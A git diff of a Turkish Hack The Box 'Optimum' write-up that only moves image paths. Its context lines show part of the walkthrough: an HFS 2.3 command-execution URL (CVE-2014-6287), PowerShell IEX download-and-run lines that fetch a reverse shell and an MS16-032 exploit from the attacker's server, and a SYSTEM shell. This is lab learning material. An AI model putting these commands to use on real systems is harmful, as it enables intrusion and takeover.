@@ -26,9 +26,9 @@ Optimum, exploit edilecek iki CVE'ye sahip bir Windows hostu olan HTB'de altınc
 
 nmap yalnızca bir açık TCP portu buldu, HTTP (80):
 
-![Pasted image 20250209174656.png](/img/user/Pasted%20image%2020250209174656.png)
+![Pasted image 20250209174656.png](/img/user/resimler/Pasted%20image%2020250209174656.png)
 
-![Pasted image 20250209174737.png](/img/user/Pasted%20image%2020250209174737.png)
+![Pasted image 20250209174737.png](/img/user/resimler/Pasted%20image%2020250209174737.png)
 
 nmap hostu Windows olarak tanımlıyor, ancak HTTP sunucusu IIS'e benzemiyor, bu nedenle işletim sistemi sürümünü öğrenmek zor.
 
@@ -39,7 +39,7 @@ nmap hostu Windows olarak tanımlıyor, ancak HTTP sunucusu IIS'e benzemiyor, bu
 
 Web sitesi tam da nmap komut dosyalarının tanımladığı şeydir - HttpFileServer (HFS):
 
-![Pasted image 20250209174813.png](/img/user/Pasted%20image%2020250209174813.png)
+![Pasted image 20250209174813.png](/img/user/resimler/Pasted%20image%2020250209174813.png)
 
 Bazı basit cred tahminlerini denedim ama olmadı.
 
@@ -47,7 +47,7 @@ Bazı basit cred tahminlerini denedim ama olmadı.
 
 Sayfanın en altında çalışan HFS'nin tam sürümü veriliyor, 2.3. searchsploit'in bu sürüm için bir exploit var:
 
-![Pasted image 20250209175000.png](/img/user/Pasted%20image%2020250209175000.png)
+![Pasted image 20250209175000.png](/img/user/resimler/Pasted%20image%2020250209175000.png)
 
 Bu güvenlik açığı CVE-2014-6287 olarak bilinmektedir.
 
@@ -144,11 +144,11 @@ http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0
 
 Bu da Optimum'un web sunucusuna ulaşıp rev.ps1 dosyasını indirmesini (ilginç bir şekilde dört kez) tetikliyor:
 
-![Pasted image 20250209180026.png](/img/user/Pasted%20image%2020250209180026.png)
+![Pasted image 20250209180026.png](/img/user/resimler/Pasted%20image%2020250209180026.png)
 
-![Pasted image 20250209180033.png](/img/user/Pasted%20image%2020250209180033.png)
+![Pasted image 20250209180033.png](/img/user/resimler/Pasted%20image%2020250209180033.png)
 
-![Pasted image 20250209180132.png](/img/user/Pasted%20image%2020250209180132.png)
+![Pasted image 20250209180132.png](/img/user/resimler/Pasted%20image%2020250209180132.png)
 
 
 ## Shell as SYSTEM
@@ -305,7 +305,7 @@ False
 
 Bunun nedeni HFS prosesinin muhtemelen 32 bit proses olarak çalışıyor olmasıdır. Bu tablo ([ss64.com](https://ss64.com/nt/syntax-64bit.html)'dan alınmıştır) mevcut oturum mimarisine göre farklı yolların nasıl çalıştığını göstermektedir:
 
-![Pasted image 20250209181241.png](/img/user/Pasted%20image%2020250209181241.png)
+![Pasted image 20250209181241.png](/img/user/resimler/Pasted%20image%2020250209181241.png)
 
 Dolayısıyla, 32 bitlik bir oturumda C:\windows\system32 yolundan PowerShell'i çağırmak 32 bitlik sürümü verecektir. 32 bit bir oturumda 64 bit işletim sistemine karşı kernel exploit çalıştırmaya çalışmak başarısız olacaktır.
 
@@ -330,7 +330,7 @@ http://10.10.10.8/?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.
 
 Ortaya çıkan shell 64 bittir:
 
-![Pasted image 20250209181539.png](/img/user/Pasted%20image%2020250209181539.png)
+![Pasted image 20250209181539.png](/img/user/resimler/Pasted%20image%2020250209181539.png)
 
 ### MS16-032
 Yukarıdaki exploit-db bağlantısı bu tür bir senaryo için çalışmayacaktır, çünkü bu bir komut çalıştırma imkanı sunmak yerine kutuda yeni bir pencere açacaktır. Neyse ki, Empire projesindeki ekip bu scriptin bir [versiyonunu](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) komut seçeneği ekleyecek şekilde uyarladı.
@@ -357,8 +357,8 @@ PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http:/
 
 Invoke-MS16032.ps1 için hemen bir istek geliyor. Son mesaj çıktıktan sonra, rev.ps1 için başka bir istek ve ardından nc'de bir shell var:
 
-![Pasted image 20250209182929.png](/img/user/Pasted%20image%2020250209182929.png)
+![Pasted image 20250209182929.png](/img/user/resimler/Pasted%20image%2020250209182929.png)
 
 Ve root.txt dosyasını alabilirim:
 
-![Pasted image 20250209183043.png](/img/user/Pasted%20image%2020250209183043.png)
+![Pasted image 20250209183043.png](/img/user/resimler/Pasted%20image%2020250209183043.png)
